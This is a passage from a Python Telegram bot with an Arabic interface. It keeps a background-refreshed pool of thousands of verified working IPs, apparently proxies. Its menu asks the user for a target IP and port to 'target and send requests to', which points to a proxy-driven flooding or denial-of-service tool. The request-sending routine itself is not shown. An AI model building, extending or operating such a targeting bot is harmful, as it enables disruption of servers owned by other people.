        f"🧪 ايبيات شغّالة فعلاً (متحقَّق منها حيّاً): <b>{len(POOL.verified):,}</b>",
        f"📥 إجمالي المرشّحين (قبل التحقق): <b>{len(POOL.candidates):,}</b>",
        f"🎯 الهدف الثابت المتوفر في الخلفية: <b>{IPS_PER_REQUEST:,}</b>",
        f"🔗 موقع التحقق/التجربة الحالي: <code>{html.escape(TEST_URL)}</code>",
        f"🕒 آخر تحديث للمصادر: قبل {age} دقيقة",
    ]
    if bad:
        lines += ["", f"⚠️ مصادر متوقفة ({len(bad)}):"]
        lines += [f"• <code>{html.escape(b)}</code>" for b in bad[:12]]
        if len(bad) > 12:
            lines.append(f"… و{len(bad) - 12} أخرى")
    await safe_edit(query, "\n".join(lines), main_menu())


async def on_button(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    if ALLOWED_USERS and query.from_user.id not in ALLOWED_USERS:
        await query.answer("⛔ هذا البوت خاص", show_alert=True)
        return
    if query.data == "extract":
        context.user_data['state'] = 'WAIT_TARGET'
        await safe_edit(query, 
            "🎯 <b>إرسال طلبات لـ IP وبورت محدد</b>\n\n"
            "الرجاء إرسال الايبي والبورت الذي تريد استهدافه وإرسال الطلبات له.\n\n"
            "💡 <b>كيف ترسل الايبي والبورت؟</b>\n"
            "اكتب الايبي، ثم نقطتين رأسيّتين (<code>:</code>)، ثم البورت.\n\n"
            "📌 <b>أمثلة صحيحة:</b>\n"
            "<code>192.168.1.100:8080</code>\n"
            "<code>1.1.1.1:32002</code>",
            parse_mode=ParseMode.HTML
        )
    elif query.data == "test":
        await do_test(query)
    elif query.data == "status":
        await do_status(query)
    else:
        await query.answer()


async def on_error(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
    log.error("خطأ غير متوقع", exc_info=context.error)


async def post_init(app: Application) -> None:
    async def maintain_pool() -> None:
        """حلقة خلفية مستمرة: تحدّث المصادر وتتحقق من الايبيات حيّاً باستمرار،
        حتى يصل المخزون الشغّال فعلاً إلى IPS_PER_REQUEST قدر الإمكان."""
        while True:
            try:
                await POOL.ensure_fresh()
                await POOL.verify_pool(IPS_PER_REQUEST)
            except Exception:  # noqa: BLE001
                log.exception("فشل التحديث/التحقق الدوري")
            await asyncio.sleep(VERIFY_LOOP_INTERVAL)

    task = asyncio.create_task(maintain_pool())
    _BG_TASKS.add(task)
    task.add_done_callback(_BG_TASKS.discard)


def main() -> None:
    if not BOT_TOKEN:
        raise SystemExit(
            "❌ المتغير BOT_TOKEN غير موجود.\n"
            "أضفه في GitHub ← Settings ← Secrets and variables ← Actions ← New repository secret"
        )

    app = (
        Application.builder()
        .token(BOT_TOKEN)
        .concurrent_updates(True)
        .connect_timeout(20)
        .read_timeout(30)
        .write_timeout(60)
        .post_init(post_init)
        .build()
    )
    app.add_handler(CommandHandler(["start", "menu"], start))
    app.add_handler(CallbackQueryHandler(on_button))
    # التقاط الردود (الايبي، البورت، والعدد)
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    app.add_error_handler(on_error)

    log.info("🤖 البوت يعمل الآن... (الهدف: %d ايبي شغّال، الموقع: %s)", IPS_PER_REQUEST, TEST_URL)
    app.run_polling(allowed_updates=["message", "callback_query"], drop_pending_updates=True)


if __name__ == "__main__":
    main()
